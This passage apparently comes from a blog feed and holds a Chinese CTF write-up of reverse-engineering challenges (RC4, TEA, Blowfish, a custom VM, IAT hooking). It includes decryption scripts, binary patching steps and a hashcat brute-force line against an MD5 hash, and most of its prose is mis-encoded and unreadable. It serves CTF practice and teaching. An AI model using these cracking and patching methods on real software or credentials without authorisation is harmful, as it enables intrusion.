class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">128</span><br>        j = (j + S[i]) % <span class="hljs-number">128</span><br>        S[i], S[j] = S[j], S[i]<br>        out.append(char ^ S[(S[i] + S[j]) % <span class="hljs-number">128</span>])<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(out)<br><br><br>data = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;572e180b1a680b3e5276344b241d5b52525a043173346b1355442028&quot;</span>)<br>key = <span class="hljs-string">b&#x27;NS5_R0Un6_z2_apK&#x27;</span><br>decrypted = rc4(data, key)<br><span class="hljs-built_in">print</span>(decrypted)<br><span class="hljs-comment">#NSSCTF&#123;V3ry_4z_1ib_W1th_4pk&#125;</span><br></code></pre></td></tr></table></figure><h2 id="EzHook-1"><a href="#EzHook-1" class="headerlink" title="EzHook-1"></a>EzHook-1</h2><p>è€ƒå¾—æ˜¯Windows IAT HookæŠ€æœ¯ï¼Œæœ¬é¢˜hookäº†MessageBoxAå‡½æ•°ï¼Œå½“æ‰§è¡ŒMessageBoxAçš„æ—¶å€™ä¼šè·‘åˆ°å¦å¤–åœ°æ–¹</p><p>4B0å‡½æ•°é‡Œé¢ä¸€å †å¼‚æˆ–ï¼Œä¸€ä¸ªä¸ªå†™å‡ºæ¥ä¸æ˜¾ç¤ºï¼Œåé¢Right?çš„è¯åº”è¯¥æ²¡è¿™ä¹ˆç®€å•</p><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714281705041-492415f8-4f1b-444a-bdb0-86bfc8c327e4.png" class="" title="img"><p>å¾€mainå‰æ‰¾ï¼Œæ‰¾åˆ°1240ï¼Œè°ƒè¯•èµ·æ¥å‘ç°è¿è¡Œåœ¨mainå‡½æ•°ä¹‹å</p><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714281994258-00e36fc8-fd2c-4c1b-8f0d-f660a2968697.png" class="" title="img"><p>1880å’Œ1840é‡Œé¢è°ƒç”¨çš„å‡½æ•°æ˜¯ä¸€æ ·çš„ï¼Œé‚£ä¹ˆå¤§æ¦‚ç‡å°±æ˜¯ä¸€å¯¹åŠ è§£å¯†å‡½æ•°</p><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714283017306-26380021-3938-42ce-bf08-a28eee88e219.png" class="" title="img"><p>ç»†çœ‹çŒœæµ‹æ˜¯xxtea</p><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714283204028-1057fe73-fad1-47b4-948d-231a663fee70.png" class="" title="img"><p>æœ€åç»™äº†ä¸ªå¼¹çª—ï¼Œä¹Ÿå°±æ˜¯è¯´a090å‡½æ•°æ˜¯MessageBoxAå‡½æ•°</p><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714282164099-ed1eb021-9a03-40ec-a21d-d7656134c270.png" class="" title="img"><p>è°ƒè¯•åˆ°è¿™é‡ŒæŠŠstr2èµ‹å€¼ç»™a2</p><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714289822893-f969cb8c-eb2c-432e-8fa9-b46ff7ff94c3.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">E4 E7 FE E3 <span class="hljs-number">17</span> 1C DE <span class="hljs-number">32</span> E6 B8 <span class="hljs-number">68</span> <span class="hljs-number">40</span> <span class="hljs-number">40</span> D8 <span class="hljs-number">72</span> FA <span class="hljs-number">88</span> <span class="hljs-number">14</span> E1 <span class="hljs-number">85</span> CD <span class="hljs-number">81</span> AA DE 1D E8 <span class="hljs-number">92</span> <span class="hljs-number">41</span> B8 1E 5E CF CE <span class="hljs-number">49</span> <span class="hljs-number">27</span> <span class="hljs-number">22</span> <span class="hljs-number">39</span> 7D <span class="hljs-number">50</span> DA<br></code></pre></td></tr></table></figure><p>é€šè¿‡æ±‡ç¼–çš„rcxè¿›å…¥ç¼–è¾‘</p><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714290752537-099c14b5-95c9-4d14-a6aa-3d4a85a2b7ad.png" class="" title="img"><p>æ¯16ä¸ªåœ°å€change byteä¸€æ¬¡ï¼ŒæŠŠå¯¹åº”çš„å¯†æ–‡å¡«è¿›å»</p><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714291965372-c1a5414e-8187-41fc-a7ab-5ad9ed66806b.png" class="" title="img">è¿è¡Œåˆ°è§£å¯†å‡½æ•°ä¹‹å<img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714292085309-cda89066-4965-4d08-b6bb-063fc93ed8d8.png" class="" title="img"><p>ç›´æ¥å°±æ˜¯å‚æ•°a1<code>NSSCTF&#123;C0ngr@tulat1ons!H0Ok_bY_1t_s3lf!&#125;</code></p><h2 id="ezcrypt-1"><a href="#ezcrypt-1" class="headerlink" title="ezcrypt-1"></a>ezcrypt-1</h2><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714305040842-0db3ff5c-724d-4d4a-b3f3-25eff4ffa6a7.png" class="" title="img"><p>åç¼–è¯‘pycï¼Œå¾—åˆ°blowfishï¼Œkeyå¹¶ä¸èƒ½ç›´æ¥ç”¨</p><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714306440783-1620cd8f-2d56-4e12-bc70-52f33c7ffccc.png" class="" title="img"><p>è€Œè¦å»crypto.cpython.pycé‡Œæ‰¾</p><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714308041598-2be10187-2584-4908-a615-47824c817da9.png" class="" title="img"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _CRT_SECURE_NO_WARNINGS</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> enc[<span class="hljs-number">5</span>] = &#123;<br>        <span class="hljs-number">1396533857</span>,<br>        <span class="hljs-number">0xCC8AE275</span>,<br>        <span class="hljs-number">0x89FB8A63</span>,<br>        <span class="hljs-number">940694833</span><br>        &#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> key[<span class="hljs-number">4</span>] = &#123;<br>        <span class="hljs-number">17</span>,<br>        <span class="hljs-number">34</span>,<br>        <span class="hljs-number">51</span>,<br>        <span class="hljs-number">68</span><br>        &#125;;<br>    <span class="hljs-type">int</span> i, j;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i += <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v0 = enc[i], v1 = enc[i + <span class="hljs-number">1</span>], sum = <span class="hljs-number">32</span> * <span class="hljs-number">0x9e3779b9</span>;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> delta = <span class="hljs-number">0x9e3779b9</span>;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> k0 = key[<span class="hljs-number">0</span>], k1 = key[<span class="hljs-number">1</span>], k2 = key[<span class="hljs-number">2</span>], k3 = key[<span class="hljs-number">3</span>];<br>        <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">32</span>; j++) &#123;<br>            v1 -= ((v0 &lt;&lt; <span class="hljs-number">3</span>) + k2 ^ v0 + sum ^ (v0 &gt;&gt; <span class="hljs-number">4</span>) + k3 ^ <span class="hljs-number">2310</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span>;<br>            v0 -= ((v1 &lt;&lt; <span class="hljs-number">3</span>) + k0 ^ v1 + sum ^ (v1 &gt;&gt; <span class="hljs-number">4</span>) + k1 ^ <span class="hljs-number">596</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span>;<br>            sum -= delta &amp; <span class="hljs-number">0xFFFFFFFF</span>;<br>        &#125;<br>        enc[i] = v0;<br>        enc[i + <span class="hljs-number">1</span>] = v1;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        <span class="hljs-comment">//printf(&quot;%u &quot;, enc[i]);</span><br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, enc);<span class="hljs-comment">//sNzEveRsjorPstce</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>keyå››ä½é‡Œé¢åè½¬ï¼Œå¾—åˆ°<code>EzNssRevProjects</code>ï¼Œç”¨è„šæœ¬åˆ†å‰²ivå’Œå¯†æ–‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ezcrypt wp</span><br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> Blowfish<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><span class="hljs-keyword">from</span> Crypto.Random <span class="hljs-keyword">import</span> get_random_bytes<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_file</span>(<span class="hljs-params">input_path, output_path, key</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-comment"># è¯»å–æ•´ä¸ªæ–‡ä»¶å†…å®¹ï¼ŒåŒ…æ‹¬IVå’Œå¯†æ–‡</span><br>        data = f.read()<br><br>        <span class="hljs-comment"># åˆ†å‰²IVå’Œå¯†æ–‡</span><br>    iv = data[:Blowfish.block_size]<br>    <span class="hljs-built_in">print</span>(iv)<br>    ciphertext = data[Blowfish.block_size:]<br>    <span class="hljs-comment">#print(ciphertext)</span><br>    <span class="hljs-comment"># éªŒè¯å¯†é’¥é•¿åº¦</span><br>    <span class="hljs-comment"># if len(key) != Blowfish.key_size:</span><br>    <span class="hljs-comment">#    raise ValueError(&quot;Invalid key size for Blowfish. It must be exactly 8 bytes long.&quot;)</span><br><br>    <span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªæ–°çš„Blowfish cipherå¯¹è±¡ï¼Œå¹¶è®¾ç½®å¯†é’¥å’ŒIV</span><br>    cipher = Blowfish.new(key, Blowfish.MODE_CBC, iv=iv)<br><br>    <span class="hljs-comment"># è§£å¯†æ•°æ®</span><br>    plaintext = (cipher.decrypt(ciphertext), Blowfish.block_size)<br>    <span class="hljs-comment">#print(plaintext[0])</span><br>    <span class="hljs-comment"># å°†è§£å¯†åçš„æ•°æ®å†™å…¥è¾“å‡ºæ–‡ä»¶</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_path, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(plaintext[<span class="hljs-number">0</span>])<br><br><br>key = <span class="hljs-string">b&#x27;EzNssRevProjects&#x27;</span><br>input_path = <span class="hljs-string">&#x27;output&#x27;</span><br>output_path = <span class="hljs-string">&#x27;flag&#x27;</span><br><br>decrypt_file(input_path, output_path, key)<br></code></pre></td></tr></table></figure><p>å¾—åˆ°elfï¼Œå‘ç°æ˜¯vmï¼Œv5æ˜¯opcodeï¼Œv4æ˜¯key</p><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714308923518-9bfcc24c-0e53-4cd6-9d1d-8181e9648994.png" class="" title="img"><p>VMå‡½æ•°æŠ„ä¸‹æ¥ç¬¦å·æ”¹ä¸€ä¸‹ï¼Œæœ‰ä¸ªåœ°æ–¹ç»™çš„ä»£ç è¿˜ä¸å¯¹ï¼Œçœ‹æ±‡ç¼–ä¹Ÿæ˜¯subï¼Œå…¶å®æ˜¯add</p><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714309032294-4f0fa075-86bc-4f35-93f6-ad2da93004f1.png" class="" title="img"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br>__int64 __fastcall <span class="hljs-title function_">vm</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* a1, <span class="hljs-type">int</span>* a2, <span class="hljs-type">int</span> a3)</span><br>&#123;<br>    __int64 result; <span class="hljs-comment">// rax</span><br>    <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+1Ch] [rbp-8h]</span><br>    <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+20h] [rbp-4h]</span><br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; ; ++i)<br>    &#123;<br>        result = i;<br>        <span class="hljs-keyword">if</span> (i &gt;= a3)<br>            <span class="hljs-keyword">break</span>;<br>        v5 = i % <span class="hljs-number">4</span>;<br>        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">4</span> == <span class="hljs-number">3</span>)<br>        &#123;<br>            a1[i] -= a2[<span class="hljs-number">8</span>] + a2[<span class="hljs-number">0</span>];<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (v5 &lt;= <span class="hljs-number">3</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (v5 == <span class="hljs-number">2</span>)<br>            &#123;<br>                a1[i] += a2[<span class="hljs-number">4</span>] ^ a2[<span class="hljs-number">12</span>];<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (v5 &lt;= <span class="hljs-number">2</span>)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (v5)<br>                &#123;<br>                    <span class="hljs-keyword">if</span> (v5 == <span class="hljs-number">1</span>)<br>                    &#123;<br>                        a1[i] ^= a2[<span class="hljs-number">0</span>] - a2[<span class="hljs-number">8</span>];<br>                    &#125;<br><br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    a1[i] ^= a2[<span class="hljs-number">16</span>] + a2[<span class="hljs-number">4</span>];<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> opcode[] =<br>    &#123;<br>        <span class="hljs-number">0x37</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xA6</span>,<br>        <span class="hljs-number">0x30</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x98</span>,<br>        <span class="hljs-number">0x17</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xDE</span><br>        &#125;;<br>    <span class="hljs-type">int</span> key[] =<br>    &#123;<br>        <span class="hljs-number">0x23</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x00</span>,<br>        <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x67</span><br>        &#125;;<br><br>    vm(opcode, key, <span class="hljs-number">30</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, opcode);<span class="hljs-comment">//NSSCTF&#123;M1xtru3_Py7h0n_1N_Rev&#125;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¨å¾®åˆ†æå¯ä»¥å†™å‡ºpythonï¼Œè¿™é‡Œè¿˜æ˜¯æŠŠä¸Šé¢çš„-æ”¹æˆï¼‹äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">data = <span class="hljs-built_in">bytearray</span>.fromhex(<br>    <span class="hljs-string">&quot;378D0FAB2D9837B548A630DA0CED1BB800E924981781EDB6268C21DE04DE&quot;</span>)<br>key = [<span class="hljs-number">0x23</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x67</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>    n = i % <span class="hljs-number">4</span><br>    <span class="hljs-keyword">if</span> (n == <span class="hljs-number">0</span>):<br>        data[i] = (data[i] ^ (key[<span class="hljs-number">4</span>] + key[<span class="hljs-number">1</span>])) &amp; <span class="hljs-number">0xff</span><br>    <span class="hljs-keyword">if</span> (n == <span class="hljs-number">1</span>):<br>        data[i] = (data[i] ^ (key[<span class="hljs-number">0</span>] - key[<span class="hljs-number">2</span>])) &amp; <span class="hljs-number">0xff</span><br>    <span class="hljs-keyword">if</span> (n == <span class="hljs-number">2</span>):<br>        data[i] = (data[i] + (key[<span class="hljs-number">3</span>] ^ key[<span class="hljs-number">1</span>])) &amp; <span class="hljs-number">0xff</span><br>    <span class="hljs-keyword">if</span> (n == <span class="hljs-number">3</span>):<br>        data[i] = (data[i] - (key[<span class="hljs-number">2</span>] + key[<span class="hljs-number">0</span>])) &amp; <span class="hljs-number">0xff</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i), end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="Go-Go-Go-1"><a href="#Go-Go-Go-1" class="headerlink" title="Go!Go!Go!-1"></a>Go!Go!Go!-1</h2><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714569262122-9cbf7caf-75a6-40f6-946c-0da32fa80229.png" class="" title="img"><p>å¤§é‡çš„WinAPIè°ƒç”¨ï¼Œè¿›å…¥1490</p><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714569301197-1a2fa243-74d9-47b5-8573-be2e47998b31.png" class="" title="img"><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714569240474-acac174f-393e-4ed9-8547-d93d0607a459.png" class="" title="img"><p>äº¤å‰å¼•ç”¨5080</p><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714569392084-9d6696b5-ecc1-4694-883e-0a3793881d1c.png" class="" title="img"><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714569422522-e4e2f11c-4a7c-4b18-9c13-4d63aeddbaf4.png" class="" title="img"><p>åŠ¨è°ƒå‘ç°qword_140005080å†…èµ„æºå¼€å¤´ä¸ºMZï¼Œæ˜¯PEæ–‡ä»¶</p><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714569598502-9b769076-af3e-4319-9116-3b1fef5b1fe7.png" class="" title="img"><p>ResourceHackeræ­£å¥½å¯ä»¥æå–</p><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714569637465-709ada2d-9e15-47cd-9e50-389db459d0ae.png" class="" title="img"><p>å¯¼å‡ºelfï¼Œåé¢å‘ç°æ˜¯exeæ–‡ä»¶</p><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714569900510-f2fc535e-7d2a-4c69-ac91-2843da8e50c0.png" class="" title="img"><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714569988419-0b17a5a3-1999-473a-b2da-4e949e2c03be.png" class="" title="img"><p><code>hashcat -m 0 -a 3 b098cacb2d43b882ef9a83168d13c3a7 ?a?a?a?a?a?a</code>(-aåé¢è·Ÿ16500è¡¨ç¤ºjwt HMAC-SHA256 å“ˆå¸Œç±»å‹ ï¼‰</p><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714653130496-24860521-cb21-4a02-9cc4-1ed49524e27c.png" class="" title="img"><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714652971580-c4ed34f1-6ee0-4d15-829d-76dc8cb98443.png" class="" title="img"><p>ç¬¬äºŒä¸ªkeyåŒç†</p><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714653355074-7348b27a-cfcb-49ae-80ca-b32b80509a6d.png" class="" title="img"><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714653601812-c16c00f1-de98-4de9-882e-08fccc8cdbee.png" class="" title="img"><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">G0@K3y` `n3SC1f<br></code></pre></td></tr></table></figure><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714653853754-c9a4291a-47d0-4da7-9a84-c983af6763cb.png" class="" title="img"><p>main1çš„ä¸¤ä¸ªkeyæ‹¼æ¥åœ¨ä¸€èµ·ä¼ åˆ°main2</p><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714654149997-fb93a477-a268-42c6-a90f-cb86b189e7a0.png" class="" title="img"><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714654109232-e0b074d6-8e25-484e-8a49-73fc12bc5abd.png" class="" title="img"><p>main2å‡½æ•°åé¢ï¼Œç¬¬ä¸‰æ¬¡è¾“å…¥çš„å°±æ˜¯flag</p><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714571422314-0dd54855-bb0c-48b8-bfa0-dd7b3a4b4234.png" class="" title="img"><p>å‘ç°RC4ç‰¹å¾ï¼Œå‘ç°é­”æ”¹äº†</p><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714571422316-a3cb806b-8cdc-430d-8350-d959538dd7c4.png" class="" title="img"><p>p-&gt;stringå°±æ˜¯è¾“å…¥çš„æ˜æ–‡</p><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714654760746-72d99bae-c36d-4c53-aef4-310d61e14656.png" class="" title="img"><p>ç”¨æ­£ç¡®çš„å¯†æ–‡ä¸€è¡Œè¡Œpatch</p><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714656386253-5d58cf54-317b-42a4-81ed-8b63ef1b7b09.png" class="" title="img"><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714656525938-cc65efb7-9052-40d1-a349-e85f307b28c1.png" class="" title="img"><p>è¾“å…¥å¯†æ–‡é•¿åº¦åŒ¹é…</p><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714656698120-dbf8d72f-1915-43bf-9fd9-3829baacbcb1.png" class="" title="img">]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>teaé­”æ”¹</tag>
      
      <tag>rc4é­”æ”¹</tag>
      
      <tag>VM</tag>
      
      <tag>hashcatçˆ†ç ´</tag>
      
      <tag>blowfishåŠ å¯†</tag>
      
      <tag>patch</tag>
      
      <tag>goè¯­è¨€</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XYCTF2024éƒ¨åˆ†wp</title>
    <link href="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/"/>
    <url>/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/</url>
    
